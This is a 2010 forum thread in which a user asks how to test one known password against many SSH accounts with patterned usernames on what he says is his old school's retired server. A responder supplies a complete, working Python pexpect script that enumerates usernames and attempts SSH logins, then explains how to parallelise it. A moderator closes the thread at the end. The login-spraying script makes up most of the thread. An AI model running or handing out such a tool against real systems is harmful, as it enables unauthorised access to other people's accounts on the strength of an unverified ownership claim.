---
title: "[SSH] Testing a non-enforced password policy"
date: 2010-03-31
forum: Security
---

### Post by blazemore on 2010-03-31
How can I test ssh access to a system, where I go over usernames which are in the format "xxxabc" (where abc is always the same and XXX changes), testing for one particular password (let's say, "foobar")

I've tried and tried but to no avail. I am competent enough at python to generate a wordlist with the usernames I need, so even a straightforward ssh thing that can test each one with a known password would be good!

Thanks in advance for your help.

ps

To clarify, I mean the following permutations:

u: aaaFIX  p: foobar
u: aabFIX  p: foobar
u: aacFIX  p: foobar
etc...

---

### Post by cdenley on 2010-03-31
Why are you doing this?

---

### Post by blazemore on 2010-03-31
> **cdenley said:**
> Why are you doing this?
Academic purposes.
I'm just interested, and I want to learn more about regex and brute-forcing.
Plus I have a (very) old server from my old school to test it on, that's with the weird username format. I want to see what insecure passwords people came up with.

---

### Post by cdenley on 2010-03-31
> **blazemore said:**
> Academic purposes.
I'm just interested, and I want to learn more about regex and brute-forcing.
Plus I have a (very) old server from my old school to test it on, that's with the weird username format. I want to see what insecure passwords people came up with.

So you're cracking passwords on your old school's server? I don't think that is legal, and I don't think this is allowed on this forum.

---

### Post by blazemore on 2010-03-31
> **cdenley said:**
> So you're cracking passwords on your old school's server? I don't think that is legal, and I don't think this is allowed on this forum.

Lol no they gave it to me ages ago, I was on pretty good terms with the IT people.
It's mine now but it's been sitting in a cupboard for ages. It's really too old, massive and noisy to be of any practical use.

---

### Post by cdenley on 2010-03-31
Sounds a bit questionable cracking weak user passwords, even if the server is no longer in use, but it sounds like the users didn't select their username, so you probably won't be able to match that user to their facebook or e-mail account. I will give this thread the benefit of the doubt, since it sounded like a fun challenge.

First, you need pexpect:
```

sudo apt-get install python-pexpect

```

Then create this script, edit the suffix and possible prefix characters at the top
```

#!/usr/bin/env python
import pexpect,sys,os

suffix='FIX'
chars='abcdefghijklmnopqrstuvwxyz'

def TryAuth(host,user,pwd):
    os.environ['SSH_ASKPASS']='/bin/false'
    ssh_newkey = 'Are you sure you want to continue connecting'
    responses=[ssh_newkey,'denied','password:',pexpect.EOF]
    p=pexpect.spawn('ssh '+user+'@'+host+' uname -a')    
    i=p.expect(responses)
    if i==0:
        p.sendline('yes')
        i=p.expect(responses)
    if i==2:
        p.sendline(pwd)
        i=p.expect(responses)
    if i==1:
        p.sendcontrol('c')
        return False
    p.close(True)
    return True

if len(sys.argv)!=3:
    print "usage: ./sshuser.py host password"
    sys.exit(0)
host=sys.argv[1]
pwd=sys.argv[2]
prefix=[0,0,0]
while prefix[0]<len(chars):  
    user=''
    for i in prefix:
        user+=chars[i]
    user+=suffix  
    print "trying "+user+"..."
    if TryAuth(host,user,pwd):
        print "MATCH FOR "+user
    for i in range(len(prefix)-1,-1,-1):
        prefix[i]+=1
        if prefix[i]>=len(chars) and i>0:
            prefix[i]=0
        else:
            break

```
make it executable, then run it
```

chmod +x sshuser.py
./sshuser.py serverip password

```

---

### Post by blazemore on 2010-03-31
> **cdenley said:**
> Sounds a bit questionable cracking weak user passwords, even if the server is no longer in use, but it sounds like the users didn't select their username, so you probably won't be able to match that user to their facebook or e-mail account. I will give this thread the benefit of the doubt, since it sounded like a fun challenge.

First, you need pexpect:
```

sudo apt-get install python-pexpect

```Then create this script, edit the suffix and possible prefix characters at the top
```

#!/usr/bin/env python
import pexpect,sys,os

suffix='FIX'
chars='abcdefghijklmnopqrstuvwxyz'

def TryAuth(host,user,pwd):
    os.environ['SSH_ASKPASS']='/bin/false'
    ssh_newkey = 'Are you sure you want to continue connecting'
    responses=[ssh_newkey,'denied','password:',pexpect.EOF]
    p=pexpect.spawn('ssh '+user+'@'+host+' uname -a')    
    i=p.expect(responses)
    if i==0:
        p.sendline('yes')
        i=p.expect(responses)
    if i==2:
        p.sendline(pwd)
        i=p.expect(responses)
    if i==1:
        p.sendcontrol('c')
        return False
    p.close(True)
    return True

if len(sys.argv)!=3:
    print "usage: ./sshuser.py host password"
    sys.exit(0)
host=sys.argv[1]
pwd=sys.argv[2]
prefix=[0,0,0]
while prefix[0]<len(chars):  
    user=''
    for i in prefix:
        user+=chars[i]
    user+=suffix  
    print "trying "+user+"..."
    if TryAuth(host,user,pwd):
        print "MATCH FOR "+user
    for i in range(len(prefix)-1,-1,-1):
        prefix[i]+=1
        if prefix[i]>=len(chars) and i>0:
            prefix[i]=0
        else:
            break

```make it executable, then run it
```

chmod +x sshuser.py
./sshuser.py serverip password

```

Wow, that's great, did you just write that?
Is there any way I can parallelise it?

---

### Post by cdenley on 2010-03-31
> **blazemore said:**
> Wow, that's great, did you just write that?
Is there any way I can parallelise it?

Yeah, I just wrote that. You could run multiple instances, each with its own section of permutations. You just need to edit these 2 lines:

```

...
host=sys.argv[1]
pwd=sys.argv[2]
**[COLOR="Red"]prefix=[0,0,0][/COLOR]**
**[COLOR="Red"]while prefix[0]<len(chars):[/COLOR]**  
    user=''
    for i in prefix:
        user+=chars[i]
    user+=suffix
...

```

For example, to run three instances with 26 possible characters (a-z):

instance 1 (aaa-izz)
```

prefix=[0,0,0]
while prefix[0]<9):  

```

instance 2 (jaa-rzz)
```

prefix=[9,0,0]
while prefix[0]<18):  

```

instance 3 (saa-zzz)
```

prefix=[18,0,0]
while prefix[0]<len(chars)):  

```

---

### Post by bodhi.zazen on 2010-03-31
I am going to close this thread now. This type of activity is not supported here, please use a security forums.

---

